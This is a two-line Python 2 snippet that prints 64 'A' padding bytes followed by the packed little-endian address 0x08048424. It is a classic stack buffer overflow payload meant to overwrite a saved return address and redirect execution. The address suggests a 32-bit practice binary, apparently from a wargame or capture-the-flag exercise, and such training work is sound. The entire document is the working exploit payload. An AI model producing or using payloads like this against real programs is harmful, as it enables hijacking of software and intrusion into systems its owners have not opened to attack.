import struct
print 'A'*64 + struct.pack('<I',0x08048424)
